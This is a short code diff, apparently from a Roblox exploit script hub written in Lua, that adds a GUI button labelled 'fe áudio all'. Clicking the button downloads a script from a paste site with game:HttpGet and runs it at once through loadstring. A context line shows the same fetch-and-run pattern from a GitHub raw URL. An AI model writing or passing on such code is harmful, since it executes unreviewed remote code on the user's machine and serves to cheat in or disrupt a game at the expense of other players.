@@ -138,6 +138,12 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/such/main/ftg'
 print("Hello World!")
 end})
 
+Tab1:AddButton({"fe áudio all", function(Value)
+--Made By Kosovo#3784
+loadstring(game:HttpGet(("https://paste.website/p/5dcfcf3e-5195-4503-9496-72d068fb63d2.txt"), true))()
+print("Hello World!")
+end})
+
 Tab1:AddButton({"Print", function(Value)
 
 print("Hello World!")
